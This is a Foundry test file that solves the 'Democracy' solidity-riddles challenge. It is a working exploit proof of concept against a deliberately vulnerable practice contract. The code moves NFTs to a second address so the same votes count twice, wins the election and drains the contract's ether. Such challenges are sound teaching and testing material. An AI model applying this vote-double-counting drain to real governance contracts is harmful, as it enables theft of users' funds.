// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.15;

import {Test} from "forge-std/Test.sol";
import {Democracy} from "../../src/solidity-riddles/Democracy.sol";

/// @title AttackDemocracy_Test
/// @author Surbhi Audichya
contract AttackDemocracy_Test is Test {
    Democracy private democracy;
    address private attacker = makeAddr("attacker");
    address private attackerAddressTwo = makeAddr("attackerAddressTwo");

    function setUp() public {
        democracy = new Democracy{value: 1 ether}();
    }

    /// Attacker can nominate as Challenger, which will mint attacker two nft and 3 votes.
    /// Attacker can transfer one NFT to other address
    /// Attacker can then 1 vote himself which will make his total votes to 4. and incumbent + challenger 9, making total votes < total cap
    /// Attacker can transfer all NFT to other address and vote again and win the election and withdraw ether
    function test_AttackDemocracy_DrainContract() external {
        vm.startPrank(attacker, attacker);
        democracy.nominateChallenger(attacker);
        democracy.transferFrom(attacker, attackerAddressTwo, 0);
        democracy.vote(attacker);
        democracy.transferFrom(attacker, attackerAddressTwo, 1);
        vm.stopPrank();
        vm.startPrank(attackerAddressTwo);
        democracy.vote(attacker);
        vm.stopPrank();
        vm.prank(attacker, attacker);
        democracy.withdrawToAddress(attacker);
        assertEq(address(democracy).balance, 0, "Challenge Incomplete");
    }
}
